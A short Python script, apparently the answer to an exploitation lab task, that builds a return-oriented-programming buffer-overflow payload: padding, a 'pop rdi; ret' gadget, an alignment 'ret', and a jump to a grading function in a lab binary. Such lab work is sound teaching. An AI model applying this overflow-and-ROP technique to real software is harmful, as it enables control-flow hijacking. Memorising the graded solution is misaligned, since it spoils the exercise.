#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
"""Task: ROP for attack/dark-calc-nx."""
import struct
import sys

POP_RDI   = 0x401A33   # pop rdi ; ret      （__libc_csu_init 内未对齐 gadget）
RET       = 0x401A34   # ret                （修正 printf 的 16 字节栈对齐）
GRADE_EVAL = 0x401978

payload  = b"A" * 24                     # expression[16] + saved rbp[8]
payload += struct.pack("<Q", POP_RDI)    # rdi = 4
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", RET)        # 栈对齐
payload += struct.pack("<Q", GRADE_EVAL) # grade_eval(4)

sys.stdout.buffer.write(payload)
